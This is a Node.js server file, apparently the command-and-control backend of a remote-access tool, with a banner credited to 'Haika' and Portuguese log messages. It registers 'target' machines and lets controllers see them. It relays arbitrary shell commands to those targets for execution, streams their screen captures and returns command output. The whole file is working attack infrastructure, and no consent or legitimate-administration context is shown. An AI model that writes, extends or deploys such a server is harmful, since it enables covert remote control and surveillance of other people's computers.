const express = require('express');
const http = require('http');
const path = require('path');
const helmet = require('helmet');
const crypto = require('crypto');
const { Server } = require('socket.io');
const { config } = require('./config');
const { router: authRouter, verifyToken } = require('./auth/authApi');
require('colors')

const app = express();
const server = http.createServer(app);
const io = new Server(server);

console.clear()

console.log(`
    _        _______             _______  _______  _______ _________ _______  _______ _________ _______ 
    ( (    /|(  ___  )|\\     /|  (  ____ )(  ____ )(  ___  )\\__    _/(  ____ \\(  ____ \\\\__   __/(  ____ \\
    |  \\  ( || (   ) || )   ( |  | (    )|| (    )|| (   ) |   )  (  | (    \\/| (    \\/   ) (   | (    \\/
    |   \\ | || |   | || | _ | |  | (____)|| (____)|| |   | |   |  |  | (__    | |         | |   | (_____ 
    | (\\ \\) || |   | || |( )| |  |  _____)| (   __)| |   | |   |  |  |  __)   | |         | |   (_____  )
    | | \\   || |   | || || || |  | (      | (\\ (   | |   | |   |  |  | (      | |         | |         ) |
    | )  \\  || (___) || () () |  | )      | ) \\ \\__| (___) ||\\_)  )  | (____/\\| (____/\\   | |   /\\____) |
    |/    )_)(_______)(_______)  |/       |/   \\__/(_______)(____/   (_______/(_______/   )_(   \\_______)
                                                                                                         
    `.magenta)


                                                                                                         console.log(`-------------------------------------------------------------------------
                                                                                                            `.red)
                                                                                                         console.log(`Developed by:`.green + ` `+ `@`.green + ` `+ `Haika
                                                                                                            `.green)
    

app.use(helmet({
    contentSecurityPolicy: false
}));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const { ACCESS_KEY } = config;
const PORT = config.PORT;

const machines = new Map();

io.on('connection', (socket) => {
    console.log(` `+ `o`.cyan +` | Nova conexão recebida`);
    const id = crypto.randomBytes(16).toString('hex');

    socket.on('auth', (data) => {
        if (data.key !== ACCESS_KEY) {
            console.log(` `+ `o`.red +` | Chave inválida`);
            socket.disconnect();
            return;
        }

        if (data.role === 'target') {
            const machineInfo = {
                id: id,
                name: data.machineName || `PC-${id.slice(0, 6)}`,
                type: 'target',
                lastSeen: new Date(),
                socket: socket
            };
            machines.set(id, machineInfo);
            console.log(` `+ `o`.green +` | Nova máquina conectada: ${machineInfo.name}`);
            
            socket.emit('auth-success', { machineId: id });
            broadcastMachineList();
        } else if (data.role === 'controller') {
            console.log(` `+ `o`.green +` | Novo controlador conectado`);
            const list = Array.from(machines.values())
                .filter(m => m.type === 'target')
                .map(m => ({
                    id: m.id,
                    name: m.name,
                    lastSeen: m.lastSeen
                }));
            socket.emit('machineList', { data: list });
        }
    });

    socket.on('screen-update', (data) => {
        io.emit('screen-data', {
            machineId: data.machineId,
            image: data.image
        });
    });

    socket.on('cmd', (data) => {
        console.log(` `+ `o`.cyan +` | Recebido comando para máquina: ${data.targetMachine}`);
        const targetMachine = machines.get(data.targetMachine);
        if (targetMachine && targetMachine.socket.connected) {
            console.log(` `+ `o`.cyan +` | Enviando comando: ${data.command}`);
            targetMachine.socket.emit('execute-command', {
                command: data.command
            });
        } else {
            console.log(` `+ `o`.red +` | Máquina não encontrada ou desconectada`);
            socket.emit('cmd-response', {
                output: 'Erro: Máquina não encontrada ou desconectada'
            });
        }
    });

    socket.on('cmd-response', (data) => {
        io.emit('cmd-response', {
            output: data.output
        });
    });

    socket.on('disconnect', () => {
        machines.forEach((machine, machineId) => {
            if (machine.socket === socket) {
                console.log(` `+ `o`.red +` | Máquina desconectada: ${machine.name}`);
                machines.delete(machineId);
                broadcastMachineList();
            }
        });
    });
});

function broadcastMachineList() {
    const list = Array.from(machines.values())
        .filter(m => m.type === 'target')
        .map(m => ({
            id: m.id,
            name: m.name,
            lastSeen: m.lastSeen
        }));

    io.emit('machineList', { data: list });
}

app.get('/', (req, res) => {
    res.redirect('/login.html');
});

app.get('/panel.html', verifyToken, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

app.use('/auth', authRouter);

server.listen(PORT, '0.0.0.0', () => {
    console.log(` `+ `o`.green +` | Servidor Aberto na porta: ${PORT}`);
}); 